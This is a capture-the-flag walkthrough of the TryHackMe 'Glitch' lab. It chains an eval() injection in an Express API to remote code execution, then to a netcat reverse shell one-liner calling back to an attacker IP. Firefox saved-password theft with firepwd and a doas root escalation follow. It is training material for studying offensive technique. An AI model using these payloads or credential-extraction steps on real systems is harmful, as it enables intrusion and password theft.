# TryHackMe — Glitch

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 18.04.5 LTS, kernel 4.15.0-135)  
> **Stack:** nginx 1.14.0 → Node.js / Express  
> **Key techniques:** API enumeration, eval() RCE, Firefox credential extraction, doas privilege escalation  

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -O 10.10.XX.XX
```

Only one port open:

| Port | Service | Version |
|------|---------|---------|
| 80   | HTTP    | nginx 1.14.0 (Ubuntu) |

The `X-Powered-By: Express` header reveals Node.js/Express behind the nginx reverse proxy.

### Directory Enumeration

```bash
gobuster dir -u http://10.10.XX.XX/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

Findings:

| Path | Status | Notes |
|------|--------|-------|
| `/img` | 301 | Static images |
| `/js` | 301 | JavaScript files |
| `/secret` | 200 | Contains a JavaScript hint |
| `/api/access` | 200 | Returns a token |
| `/api/items` | 200 | Returns JSON data |

---

## Exploitation

### Step 1 — Access Token

The `/secret` page contains a function that calls `/api/access`:

```javascript
function getAccess() {
  fetch('/api/access')
    .then((response) => response.json())
    .then((response) => { console.log(response); });
}
```

Calling the endpoint:

```bash
curl -s http://10.10.XX.XX/api/access
# {"token":"dGhpc19pc19ub3RfcmVhbA=="}

echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d
# this_is_not_real
```

**Answer to "What is your access token?":** `this_is_not_real`

### Step 2 — Cookie-Based Authentication

Setting the token as a cookie unlocks the full website (title changes from `not allowed` to `sad.`):

```bash
curl -s http://10.10.XX.XX/ -b "token=this_is_not_real"
```

> **Note:** Only plain-text cookie works. Base64, Authorization header, and query parameters all fail. Without the correct cookie, the server responds with `Set-Cookie: token=value` — overwriting any valid token.

### Step 3 — API Parameter Fuzzing → eval() RCE

The `/api/items` endpoint accepts POST requests (`Allow: GET,HEAD,POST`). The key vulnerability is in the **query string**, not the JSON body.

**Finding the parameter:**

```bash
ffuf -X POST -u "http://10.10.XX.XX/api/items?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -b "token=this_is_not_real" \
  -mc all -fs 45 -t 50
```

This reveals the `cmd` parameter. Server-side code (`/var/web/routes/api.js`):

```javascript
router.post('/items', (req, res) => {
  if (req.query.cmd) res.send('vulnerability_exploited ' + eval(req.query.cmd));
  else res.status(400).json({ message: 'there_is_a_glitch_in_the_matrix' });
});
```

The value of `cmd` is passed directly to `eval()` — classic **server-side JavaScript injection**.

**Confirming RCE:**

```bash
curl -s -X POST \
  "http://10.10.XX.XX/api/items?cmd=require('child_process').execSync('id').toString()" \
  -b "token=this_is_not_real"
# vulnerability_exploited uid=1000(user) gid=1000(user) groups=1000(user),30(dip),46(plugdev)
```

### Step 4 — User Flag

```bash
curl -s -X POST \
  "http://10.10.XX.XX/api/items?cmd=require('child_process').execSync('cat%20/home/user/user.txt').toString()" \
  -b "token=this_is_not_real"
```

### Step 5 — Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Trigger
curl -s -X POST \
  "http://10.10.XX.XX/api/items?cmd=require('child_process').exec('rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202>%261%7Cnc%20YOUR_IP%204444%20>/tmp/f')" \
  -b "token=this_is_not_real"
```

Stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Privilege Escalation

### Step 6 — Firefox Credential Extraction

Enumeration reveals three users with bash: `root`, `user`, `v0id`. The `user` home directory contains a `.firefox` profile with saved passwords:

```
/home/user/.firefox/b5w4643p.default-release/logins.json
/home/user/.firefox/b5w4643p.default-release/key4.db
```

**Extracting the files** (key4.db is binary — use base64):

```bash
# On target via RCE
base64 /home/user/.firefox/b5w4643p.default-release/key4.db > /tmp/key4.b64
base64 /home/user/.firefox/b5w4643p.default-release/cert9.db > /tmp/cert9.b64
cat /home/user/.firefox/b5w4643p.default-release/logins.json > /tmp/logins.json

# On attacker — transfer and decode
# (or use base64 output via RCE curl commands)
base64 -d key4.b64 > key4.db
base64 -d cert9.b64 > cert9.db
```

**Decrypting with firepwd:**

```bash
git clone https://github.com/lclevy/firepwd.git
pip3 install pycryptodome pyasn1
mkdir firefox_profile
cp key4.db logins.json cert9.db firefox_profile/
python3 firepwd/firepwd.py -d firefox_profile/
```

Result:

```
https://glitch.thm: v0id, love_the_void
```

### How Firefox Password Storage Works

Firefox stores saved credentials in two files:

- **`logins.json`** — encrypted usernames and passwords (AES-CBC, encrypted with NSS key)
- **`key4.db`** — NSS database containing the master decryption key

If the user has not set a **master password** in Firefox (most don't), the key is stored unprotected and can be extracted with tools like `firepwd`, `firefox_decrypt`, or `LaZagne`.

### Step 7 — Lateral Movement to v0id

```bash
su v0id
# Password: love_the_void
```

### Step 8 — doas → Root

SUID enumeration reveals a non-standard binary:

```bash
find / -perm -4000 -type f 2>/dev/null
# ...
# /usr/local/bin/doas
```

`doas` is an OpenBSD alternative to sudo. Its config:

```bash
cat /usr/local/etc/doas.conf
# permit v0id as root
```

This means v0id can run **any command** as root:

```bash
doas -u root /bin/bash
# Password: love_the_void
cat /root/root.txt
```

---

## Mistakes Made & Lessons Learned

### 1. ffuf Default Status Code Matching — THE Critical Miss

**What happened:** When fuzzing `?FUZZ=test`, the parameter `cmd` was in the wordlist. But `eval("test")` threw a `ReferenceError` and returned **HTTP 500**. ffuf's default matcher only accepts `200, 204, 301, 302, 307, 401, 403, 405` — **500 is silently dropped**.

**Fix:**

```bash
# WRONG — misses 500 responses
ffuf -u "http://target/api/items?FUZZ=test" -w wordlist.txt -fs 45

# RIGHT — match ALL status codes, filter by response size
ffuf -u "http://target/api/items?FUZZ=test" -w wordlist.txt -mc all -fs 45
```

> **Rule: Always use `-mc all` when fuzzing.** Filter noise with `-fs` (size), `-fw` (words), `-fl` (lines) — never rely on default status code matching.

### 2. Fuzzing JSON Body Instead of Query String

**What happened:** Seeing `POST /api/items` with Express, I immediately assumed the parameter was in the JSON body (`{"cmd":"test"}`). Hours were spent fuzzing body fields. The actual vulnerability was in `req.query.cmd` — the **query string**.

**Fix:** Always fuzz both attack surfaces:

```bash
# Query string parameters
ffuf -X POST -u "http://target/api/items?FUZZ=test" -w wordlist.txt -mc all -fs 45

# JSON body keys
ffuf -X POST -u "http://target/api/items" -w wordlist.txt -mc all -fs 45 \
  -H "Content-Type: application/json" -d '{"FUZZ":"test"}'
```

> **Rule: POST endpoints have two parameter surfaces — query string (`req.query`) and body (`req.body`). Fuzz both.**

### 3. Not Using `-i` / `-v` Consistently with curl

**What happened:** An early `curl -s` (silent mode, no headers) on `{"item":"test"}` returned empty output. I interpreted this as "accepted" — but it was actually an error with an empty body. Using `curl -i` would have shown the `400` status code immediately.

**Fix:**

```bash
# WRONG — hides critical information
curl -s -X POST http://target/api/items -d '{"item":"test"}'

# RIGHT — always see status codes and headers during recon
curl -s -i -X POST http://target/api/items -d '{"item":"test"}'
```

> **Rule: During reconnaissance, always use `curl -i` or `curl -v`. Silent mode is for scripting, not for exploration.**

### 4. HTTP 500 = Information, Not Failure

The 500 response from `eval("test")` included a full **stack trace**:

```
ReferenceError: test is not defined
    at eval (eval at router.post (/var/web/routes/api.js:25:60))
```

This revealed: the file path (`/var/web/routes/api.js`), the line number (25), the function (`eval`), and confirmed the exact vulnerability class. **Error responses are reconnaissance gold.**

> **Rule: Never ignore 500 errors. Read the response body — stack traces, error messages, and debug output often reveal the attack path.**

---

## Fuzzing Cheat Sheet (Reference)

```bash
# Parameter discovery — ALWAYS use -mc all
ffuf -u "http://target/path?FUZZ=test" -w wordlist.txt -mc all -fs <default_size>

# POST body fuzzing
ffuf -X POST -u "http://target/path" -w wordlist.txt -mc all -fs <default_size> \
  -H "Content-Type: application/json" -d '{"FUZZ":"test"}'

# Directory fuzzing — include error codes
ffuf -u "http://target/FUZZ" -w wordlist.txt -mc all -fc 404

# With authentication
ffuf -u "http://target/FUZZ" -w wordlist.txt -mc all -b "cookie=value"

# Useful filters
-fs 45        # Filter by response size (bytes)
-fw 1         # Filter by word count
-fl 10        # Filter by line count
-fc 404       # Filter by status code
-mc all       # Match ALL status codes (override default)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning, service detection |
| gobuster / ffuf | Directory and parameter fuzzing |
| curl | Manual HTTP requests and RCE |
| firepwd | Firefox password decryption |
| netcat | Reverse shell listener |
| doas | Privilege escalation to root |

---

## Kill Chain Summary

```
nmap (port 80)
  → gobuster (/secret, /api/access, /api/items)
    → /api/access → base64 token → cookie auth
      → ffuf -mc all → POST /api/items?cmd= → eval() RCE
        → user shell → .firefox/logins.json + key4.db
          → firepwd → v0id:love_the_void
            → su v0id → doas -u root /bin/bash → ROOT
```
